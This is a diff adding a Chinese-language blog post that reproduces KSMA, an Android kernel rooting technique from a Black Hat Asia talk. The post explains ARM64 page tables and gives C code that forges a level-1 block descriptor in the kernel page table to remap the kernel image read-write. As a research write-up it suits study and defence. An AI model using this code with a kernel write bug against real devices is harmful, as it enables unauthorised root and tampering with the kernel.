@@ -1,0 +1,546 @@
+<!doctype html>
+<html class="theme-next use-motion ">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.3"/>
+
+
+    <meta name="description" content="Personal Blog" />
+
+
+
+  <meta name="keywords" content="Android Root KSMA," />
+
+
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.3" />
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: '',
+    analytics: {
+      google: ''
+    },
+    sidebar: 'post'
+  };
+</script>
+
+
+
+
+  <title> KSMA--Android通用Root技术 // GeneBlue's Blog </title>
+</head>
+
+<body>
+<!--[if lte IE 8]> <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'> <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode"><img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820" alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari." style='margin-left:auto;margin-right:auto;display: block;'/></a></div> <![endif]-->
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <div id="header" class="header">
+      <div class="header-inner">
+        <h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand">
+      <span class="logo">
+        <i class="icon-logo"></i>
+      </span>
+      <span class="site-title">GeneBlue's Blog</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+
+  <ul id="menu" class="menu">
+     
+    
+      
+      <li class="menu-item menu-item-home">
+        <a href="/">
+          <i class="menu-item-icon icon-home"></i> <br />
+          首页
+        </a>
+      </li>
+    
+      
+      <li class="menu-item menu-item-about">
+        <a href="/about">
+          <i class="menu-item-icon icon-about"></i> <br />
+          关于
+        </a>
+      </li>
+    
+      
+      <li class="menu-item menu-item-archives">
+        <a href="/archives">
+          <i class="menu-item-icon icon-archives"></i> <br />
+          归档
+        </a>
+      </li>
+    
+      
+      <li class="menu-item menu-item-tags">
+        <a href="/tags">
+          <i class="menu-item-icon icon-tags"></i> <br />
+          标签
+        </a>
+      </li>
+    
+  </ul>
+
+
+      </div>
+    </div>
+
+    <div id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content">
+          
+
+  <div id="posts" class="posts-expand">
+    
+
+  <div class="post post-type-normal ">
+    <div class="post-header">
+
+      
+      
+        <h1 class="post-title">
+          
+          
+            
+              KSMA--Android通用Root技术
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于 2018-10-27
+        </span>
+
+        
+
+        
+          
+        
+      </div>
+    </div>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <p><strong>Author: GeneBlue</strong></p>
+<p>2018 年 <code>blackhat asia</code> 会议上，阿里巴巴的安全研究员 <code>ThomasKing</code> 做了 <code>Android Root</code> 方面的主题演讲，题为<code>《KSMA-Breaking-Android-kernel-isolation-and-Rooting-with-ARM-MMU-features》</code>。笔者对这样的通用 Root 方式是比较感兴趣的，便着手复现了一下。</p>
+<a id="more"></a>
+<p>ThomasKing 为这种通用 root 方式起了个不错的名字 <code>KSMA(Kernel Space Mirroring Attack)</code>，意为内核空间镜像攻击。简单的说，在内核的一级页表中伪造一个 <code>d_block</code> 类型的 <code>descriptor</code> (内存描述符)，将内核镜像所在的 <code>PA</code> (物理地址) 映射到 descriptor 所对应的 <code>VA</code> (虚拟地址) 处。通过修改 <code>d_block</code> 中的一些内存属性，就可以做到对 VA 处映射的内核镜像做读写操作，从而可以任意修改内核代码。</p>
+<h3 id="0X01-linux-页表介绍"><a href="#0X01-linux-页表介绍" class="headerlink" title="0X01 linux 页表介绍"></a>0X01 linux 页表介绍</h3><p>linux 内核采用分页机制管理 VA，并使用 <code>MMU</code>（内存管理单元） 完成 VA 到 PA 的转换。page (内存页) 大小一般为 4KB 16KB 或者 64 KB，为了更有效率的管理 page，内核使用 page table（页表）来组织所有page。页表是分级的，pc 系统一般使用4级页表，现阶段 android 系统采用3级页表，页大小 4KB。以下均以 4KB 3级页表作为讨论基础。</p>
+<p>下面图表搭配着看比较好理解一些，下图位于 <code>armv8 手册 D4-1744</code> 处，下表位于内核 <code>Documentation/arm64/memory.txt</code> 处。</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB890171d0667f476846c4f1a9c8781743?method=download&amp;shareKey=f338fab90d6950d6e791a8a2034c7f94" alt="image"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">AArch64 Linux memory layout with 4KB pages:</div><div class="line"><span class="keyword">Start</span>			<span class="keyword">End</span>			<span class="keyword">Size</span>		<span class="keyword">Use</span></div><div class="line"><span class="comment">-----------------------------------------------------------------------</span></div><div class="line"><span class="number">0000000000000000</span>	<span class="number">0000007</span>fffffffff	 <span class="number">512</span>GB		<span class="keyword">user</span></div><div class="line">ffffff8000000000	ffffffbbfffeffff	~<span class="number">240</span>GB		vmalloc</div><div class="line">ffffffbbffff0000	ffffffbbffffffff	  <span class="number">64</span>KB		[<span class="keyword">guard</span> page]</div><div class="line">ffffffbc00000000	ffffffbdffffffff	   <span class="number">8</span>GB		vmemmap</div><div class="line">ffffffbe00000000	ffffffbffbbfffff	  ~<span class="number">8</span>GB		[<span class="keyword">guard</span>, future vmmemap]</div><div class="line">ffffffbffa000000	ffffffbffaffffff	  <span class="number">16</span>MB		PCI I/O <span class="keyword">space</span></div><div class="line">ffffffbffb000000	ffffffbffbbfffff	  <span class="number">12</span>MB		[<span class="keyword">guard</span>]</div><div class="line">ffffffbffbc00000	ffffffbffbdfffff	   <span class="number">2</span>MB		<span class="keyword">fixed</span> mappings</div><div class="line">ffffffbffbe00000	ffffffbffbffffff	   <span class="number">2</span>MB		[<span class="keyword">guard</span>]</div><div class="line">ffffffbffc000000	ffffffbfffffffff	  <span class="number">64</span>MB		modules</div><div class="line">ffffffc000000000	ffffffffffffffff	 <span class="number">256</span>GB		kernel <span class="keyword">logical</span> <span class="keyword">memory</span> <span class="keyword">map</span></div></pre></td></tr></table></figure>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">Translation table lookup with 4KB pages:</div><div class="line">+--------+--------+--------+--------+--------+--------+--------+--------+</div><div class="line">|<span class="string">63    56</span>|<span class="string">55    48</span>|<span class="string">47    40</span>|<span class="string">39    32</span>|<span class="string">31    24</span>|<span class="string">23    16</span>|<span class="string">15     8</span>|<span class="string">7      0</span>|</div><div class="line">+--------+--------+--------+--------+--------+--------+--------+--------+</div><div class="line"> |<span class="string">                 </span>|<span class="string">         </span>|<span class="string">         </span>|<span class="string">         </span>|<span class="string">         </span>|</div><div class="line"> |<span class="string">                 </span>|<span class="string">         </span>|<span class="string">         </span>|<span class="string">         </span>|<span class="string">         v</span></div><div class="line"> |<span class="string">                 </span>|<span class="string">         </span>|<span class="string">         </span>|<span class="string">         </span>|<span class="string">   [11:0]  in-page offset</span></div><div class="line"> |<span class="string">                 </span>|<span class="string">         </span>|<span class="string">         </span>|<span class="string">         +-&gt; [20:12] L3 index</span></div><div class="line"> |<span class="string">                 </span>|<span class="string">         </span>|<span class="string">         +-----------&gt; [29:21] L2 index</span></div><div class="line"> |<span class="string">                 </span>|<span class="string">         +---------------------&gt; [38:30] L1 index</span></div><div class="line"> |<span class="string">                 +-------------------------------&gt; [47:39] L0 index (not used)</span></div><div class="line"> +-------------------------------------------------&gt; [63] TTBR0/1</div></pre></td></tr></table></figure>
+<ul>
+<li>usr 空间地址范围为：0x0000000000000000 ～ 0x0000007fffffffff，共计 512GB</li>
+<li>kernel 空间地址范围为：0xffffff8000000000 ～ 0xffffffffffffffff，共计 512GB</li>
+</ul>
+<p>对于3级页表，Level 0 table 并未采用，通过 Level 1 table 可以获取 Level 2 table 的内存位置，通过 Level 2 table 可以获取 Level 3 table 的内存位置，Level 3 table 又可以获取具体 page 所在的内存位置。</p>
+<p>比如 0xffffffc000080030 这个 VA 按照上述翻译表的计算方式，可获知</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">vaddr = <span class="number">0xffffffc000080030</span></div><div class="line">ttbr1 </div><div class="line">poffset = <span class="number">0x30</span></div><div class="line">L0_index = <span class="number">0x1ff</span>    L1_index = <span class="number">0x100</span>    L2_index = <span class="number">0x0</span>    L3_index = <span class="number">0x80</span></div></pre></td></tr></table></figure>
+<p>ttbr1 表明这是一个内核地址，poffseet 表明内存在页内偏移为 0x30，L0页表没采用，数值没意义，是一级页表(pgd)的第 0x100 项，二级页表(pmd)的第0项，三级页表(pte)的第0x80项。</p>
+<p>需要说明的是内核与用户态进程使用的不是同一份页表，内核拥有自己单独的页表，内核线程共享，用户态进程分别拥有自己的页表。</p>
+<p>内核页表在内核初始化时静态创建，如下 <code>init_mm</code>。pgd 指向 <code>swapper_pg_dir</code>，在没有 KASLR 的情况下，该全局变量是一个固定值 <code>0xffffffc00007d000</code>，所以内核一级页表位于固定内存位置</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">struct mm_struct <span class="attr">init_mm</span> = &#123;</div><div class="line">	.<span class="attr">mm_rb</span>		= RB_ROOT,</div><div class="line">	.<span class="attr">pgd</span>		= swapper_pg_dir,</div><div class="line">	.<span class="attr">mm_users</span>	= ATOMIC_INIT(<span class="number">2</span>),</div><div class="line">	.<span class="attr">mm_count</span>	= ATOMIC_INIT(<span class="number">1</span>),</div><div class="line">	.<span class="attr">mmap_sem</span>	= __RWSEM_INITIALIZER(init_mm.mmap_sem),</div><div class="line">	.<span class="attr">page_table_lock</span> =  __SPIN_LOCK_UNLOCKED(init_mm.page_table_lock),</div><div class="line">	.<span class="attr">mmlist</span>		= LIST_HEAD_INIT(init_mm.mmlist),</div><div class="line">	INIT_MM_CONTEXT(init_mm)</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
+<p>用户程序页表是在创建用户态程序时动态分配在内核堆中，这一点，可以从 <code>execve</code> 的内核实现中看出，调用关系如下：</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">`do_execve_common<span class="function"><span class="params">()</span> --&gt;</span> bprm_mm_init<span class="function"><span class="params">()</span> --&gt;</span> mm_alloc<span class="function"><span class="params">()</span> --&gt;</span> mm_init<span class="function"><span class="params">()</span> --&gt;</span> mm_alloc_pgd<span class="function"><span class="params">()</span> --&gt;</span> pgd_alloc()`</div></pre></td></tr></table></figure>
+<p>一级页表有两种描述符（64bit），<code>table</code>类型和 <code>block</code> 类型，如下图所示，<code>block</code> 类型指向指定的 <code>1GB</code> 内存区域，<code>table</code> 类型描述下一级页表的起始地址。对于伪造页表攻击，我们关心的是一级页表中 block 类型的页表项。</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBb8ef880298a8e37e39fc991c22a38c2f?method=download&amp;shareKey=fe301ad96cfd7e32d0e77d98d07ecb5f" alt="image"></p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB11a40c886d0b96e359984395da276d29?method=download&amp;shareKey=696a4fb5bcbcebf28444dda498391931" alt="image"></p>
+<p>关键在于要理解 d_block 描述符各 bit 意义，各 bit 详情参见 <code>arm 手册，D4-1796</code>，需要说明 <code>AP[2:1]</code> 和 <code>output address</code>：</p>
+<ul>
+<li>bit[7:6]: AP[2:1] 属性，设置对应内存的数据访问权限，需要设置为内存可读写，这是我们关心的</li>
+<li>bit[47:30]: output address 表示 d_block 要映射 PA 的 [47:30] bit 位的值。</li>
+</ul>
+<h3 id="0X02-伪造ttbr1的d-block描述符"><a href="#0X02-伪造ttbr1的d-block描述符" class="headerlink" title="0X02 伪造ttbr1的d_block描述符"></a>0X02 伪造ttbr1的d_block描述符</h3><p>理解上述页表的过程，伪造 <code>d_block</code> 页表就很简单了，前提是拥有至少一次内核地址写操作。所以，这种利用方法可以搭配某些地址写的漏洞使用。</p>
+<p>拥有一次写地址权限后，在特定位置上写上 d_block 即可。</p>
+<p>特定位置也就是伪造的 d_block 描述符应该在内存什么位置。该内存位置是可以计算出来的。内核 VA中有很多的地址空间是没有被使用的，准确的说，没有被映射过。这些内存空洞就可以用来重新映射内核镜像 PA。不考虑 KASLR 的情形，内核镜像加载的起始地址一般为 0xffffffc000000000，镜像大小 1Gb（0x40000000 Byte） 左右。0xffffffc200000000 开始的区域通常为内存空洞区域，我们可以将该地址开始的 1Gb 空间，作为再次映射内核 PA 的 VA。当然也是可以采用其他区域的，比如 0xffffffc300000000 开始的 VA，这里以 0xffffffc200000000 作为示例</p>
+<p>计算 0xffffffc200000000（vaddr） 对应的一级页表 d_block 描述符位置的过程如下：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="attr">L1_index</span> = (vaddr &amp; <span class="number">0</span>x0000007fc0000000) &gt;&gt; <span class="number">30</span>;</div><div class="line"><span class="attr">fake_d_block_addr</span> = swapper_pg_dir + L1_index * <span class="number">0</span>x8;</div></pre></td></tr></table></figure>
+<p>确定好位置后，按照上述 <code>d_block</code> 各 bit 意义构造好 <code>fake_d_block</code>，用地址写漏洞写入指定位置。</p>
+<p>之后，内核 PA 就会被映射到 vaddr 处，直接使用指针操作 vaddr 内存即可。</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB7cd983095a21a65176e72002f61798d9?method=download&amp;shareKey=fe16e5356e388ff7754d9ff90cc4ccfb" alt="image"></p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBc386e99d610ffa1ea8103ba4f0355367?method=download&amp;shareKey=4fcf5b1da89af80080b47c313d6f2534" alt="image"></p>
+<h3 id="0X03-主要代码"><a href="#0X03-主要代码" class="headerlink" title="0X03 主要代码"></a>0X03 主要代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_OFFSEST 0xffffffc000000000</span></div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> * </div><div class="line"> * </div><div class="line">Android arm64 Translation table lookup with 4KB pages:</div><div class="line">+--------+--------+--------+--------+--------+--------+--------+--------+</div><div class="line">|63    56|55    48|47    40|39    32|31    24|23    16|15     8|7      0|</div><div class="line">+--------+--------+--------+--------+--------+--------+--------+--------+</div><div class="line"> |                 |         |         |         |         |</div><div class="line"> |                 |         |         |         |         v</div><div class="line"> |                 |         |         |         |   [11:0]  in-page offset</div><div class="line"> |                 |         |         |         +-&gt; [20:12] L3 index</div><div class="line"> |                 |         |         +-----------&gt; [29:21] L2 index</div><div class="line"> |                 |         +---------------------&gt; [38:30] L1 index</div><div class="line"> |                 +-------------------------------&gt; [47:39] L0 index (not used)</div><div class="line"> +-------------------------------------------------&gt; [63] TTBR0/1</div><div class="line"> * 解析 vaddr 获取在页表中各种数值</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">parse_vaddr</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> vaddr)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> ttrb0 = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> poffset = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> L0_index = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> L1_index = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> L2_index = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> L3_index = <span class="number">0</span>;</div><div class="line"></div><div class="line">    ttrb0 = (vaddr &amp; <span class="number">0x8000000000000000</span>) &gt;&gt; <span class="number">63</span>;</div><div class="line">    poffset = (vaddr &amp; <span class="number">0x0000000000000fff</span>);</div><div class="line">    L0_index = (vaddr &amp; <span class="number">0x0000ff8000000000</span>) &gt;&gt; <span class="number">39</span>;</div><div class="line">    L1_index = (vaddr &amp; <span class="number">0x0000007fc0000000</span>) &gt;&gt; <span class="number">30</span>;</div><div class="line">    L2_index = (vaddr &amp; <span class="number">0x000000003fe00000</span>) &gt;&gt; <span class="number">21</span>;</div><div class="line">    L3_index = (vaddr &amp; <span class="number">0x00000000001ff000</span>) &gt;&gt; <span class="number">12</span>;</div><div class="line">    </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"[%s] vaddr = 0x%lx\n"</span>, __func__, vaddr);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"[%s] ttbr%d \n"</span>, __func__, ttrb0);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"[%s] poffset = 0x%x\n"</span>, __func__, poffset);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"[%s] L0_index = 0x%x    L1_index = 0x%x    L2_index = 0x%x    L3_index = 0x%x\n"</span>, </div><div class="line">        __func__, L0_index, L1_index, L2_index, L3_index);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> * vaddr 是内核内存的空洞区域，伪造其 L1 pagetable 中 d_block 表项</div><div class="line"> * 以下 bits 位的具体信息要参考 armv8 的手册 D4-1791</div><div class="line"> * 1 Gb = 0x40000000 Byte</div><div class="line"> * 0x40000000</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">fake_dblock_in_level1_page_table</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> kimg_phys_addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> L1_table_start_addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> vaddr)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> fake_d_block = <span class="number">0l</span>;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> fake_d_block_addr = <span class="number">0l</span>;</div><div class="line"></div><div class="line">    <span class="comment">// 计算伪造 vaddr 的L1 页表项位置</span></div><div class="line">    <span class="keyword">int</span> L1_index = <span class="number">0</span>;</div><div class="line">    L1_index = (vaddr &amp; <span class="number">0x0000007fc0000000</span>) &gt;&gt; <span class="number">30</span>;</div><div class="line">    fake_d_block_addr = L1_table_start_addr + L1_index * <span class="number">0x8</span>;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"L1_inde = 0x%x fake_d_block_addr = 0x%lx\n"</span>, L1_index, fake_d_block_addr);</div><div class="line"></div><div class="line">    <span class="comment">// d_block 中的内容，主要是修改 AP[2:1], 修改为读写属性</span></div><div class="line">    <span class="comment">// bit[1:0]</span></div><div class="line">    fake_d_block = fake_d_block | (<span class="number">0x0000000000000001</span>);     <span class="comment">//                  Y</span></div><div class="line">    <span class="comment">// bit[11:2] lower block attributes</span></div><div class="line">    fake_d_block = fake_d_block | (<span class="number">0x0000000000000800</span>);     <span class="comment">// nG, bit[11]      Y</span></div><div class="line">    fake_d_block = fake_d_block | (<span class="number">0x0000000000000400</span>);     <span class="comment">// AF, bit[10]      Y</span></div><div class="line">    fake_d_block = fake_d_block | (<span class="number">0x0000000000000200</span>);     <span class="comment">// SH, bits[9:8]</span></div><div class="line">    fake_d_block = fake_d_block | (<span class="number">0x0000000000000040</span>);     <span class="comment">// AP[2:1], bits[7:6]</span></div><div class="line">    fake_d_block = fake_d_block | (<span class="number">0x0000000000000020</span>);     <span class="comment">// NS, bit[5]       Y</span></div><div class="line">    fake_d_block = fake_d_block | (<span class="number">0x0000000000000010</span>);     <span class="comment">// AttrIndx[2:0], bits[4:2]</span></div><div class="line">    <span class="comment">// bit[29:12] RES0</span></div><div class="line">    <span class="comment">// bit[47:30] output address</span></div><div class="line">    fake_d_block = fake_d_block | (kimg_phys_addr &amp; <span class="number">0x0000ffffc0000000</span>);</div><div class="line">    <span class="comment">// bit[51:48] RES0</span></div><div class="line">    <span class="comment">// bit[63:52] upper block attributes, [63:55] ignored</span></div><div class="line">    fake_d_block = fake_d_block | (<span class="number">0x0010000000000000</span>);     <span class="comment">// Contiguous, bit[52]</span></div><div class="line">    fake_d_block = fake_d_block | (<span class="number">0x0020000000000000</span>);     <span class="comment">// PXN, bit[53]</span></div><div class="line">    fake_d_block = fake_d_block | (<span class="number">0x0040000000000000</span>);     <span class="comment">// XN, bit[54]</span></div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"[fake] vaddr = 0x%lx\n"</span>, vaddr);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"[fake] fake_d_block_addr = 0x%lx  --&gt; 0x%016lx\n"</span>, fake_d_block_addr, fake_d_block);</div><div class="line"></div><div class="line">    errno = <span class="number">0</span>;</div><div class="line">    write_at_address_pipe((<span class="keyword">void</span>*)fake_d_block_addr, &amp;fake_d_block, <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>));</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"write errno = %d %s\n"</span>, errno , strerror(errno));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_addr_directly</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> addr = <span class="number">0xffffffc200000000</span> + <span class="number">0x20000000</span> + <span class="number">0x80000</span>;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"0x%lx  --&gt; 0x%lx\n"</span>, addr, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *) addr);</div><div class="line">    </div><div class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *) addr = <span class="number">0x100</span>;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"0x%lx  --&gt; 0x%lx\n"</span>, addr, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *) addr);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></div><div class="line">&#123;</div><div class="line">    disable_addr_limit();</div><div class="line"></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kimage_phys_addr = <span class="number">0x20000000</span>;  <span class="comment">// 内核镜像加载的起始物理地址 memstart_addr 值</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> L1_table_start_addr = <span class="number">0xffffffc00007d000</span>;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> fake_kernel_vaddr = <span class="number">0xffffffc000000000</span>; <span class="comment">// 0xffffffc200000000</span></div><div class="line">    fake_dblock_in_level1_page_table(kimage_phys_addr, L1_table_start_addr, fake_kernel_vaddr);</div><div class="line">    </div><div class="line">    test_addr_directly();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="0X04-参考"><a href="#0X04-参考" class="headerlink" title="0X04 参考"></a>0X04 参考</h3><ul>
+<li><a href="https://android.googlesource.com/kernel/msm.git/+/android-msm-angler-3.10-marshmallow-dr1.5/Documentation/arm64/memory.txt" target="_blank" rel="external">arm64 memory</a></li>
+<li><a href="https://bbs.pediy.com/thread-228453.htm" target="_blank" rel="external">利用ARM MMU硬件特性开启安卓8终端的上帝模式</a></li>
+<li><a href="https://www.blackhat.com/docs/asia-18/asia-18-WANG-KSMA-Breaking-Android-kernel-isolation-and-Rooting-with-ARM-MMU-features.pdf" target="_blank" rel="external">asia-18-WANG-KSMA-Breaking-Android-kernel-isolation-and-Rooting-with-ARM-MMU-features</a></li>
+</ul>
+
+      
+    </div>
+
+    <div class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Android-Root-KSMA/"> #Android Root KSMA </a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/01/05/IDA插件推荐-Keypatch/">IDA插件推荐-Keypatch</a>
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </div>
+  </div>
+
+
+
+    
+      <div class="comments" id="comments">
+        
+      </div>
+    
+  </div>
+
+
+        </div>
+
+        
+      </div>
+
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview">
+        <div class="site-author motion-element">
+          <img class="site-author-image" src="/images/default_avatar.jpg" alt="GeneBlue" />
+          <p class="site-author-name">GeneBlue</p>
+        </div>
+        <p class="site-description motion-element">Personal Blog</p>
+        <div class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">23</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">0</span>
+              <span class="site-state-item-name">分类</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">14</span>
+              <span class="site-state-item-name">标签</span>
+              </a>
+          </div>
+
+        </div>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+      </div>
+
+      
+        <div class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0X01-linux-页表介绍"><span class="nav-number">1.</span> <span class="nav-text">0X01 linux 页表介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0X02-伪造ttbr1的d-block描述符"><span class="nav-number">2.</span> <span class="nav-text">0X02 伪造ttbr1的d_block描述符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0X03-主要代码"><span class="nav-number">3.</span> <span class="nav-text">0X03 主要代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0X04-参考"><span class="nav-number">4.</span> <span class="nav-text">0X04 参考</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </div>
+      
+
+    </div>
+  </div>
+
+
+    </div>
+
+    <div id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; &nbsp; 
+  2019
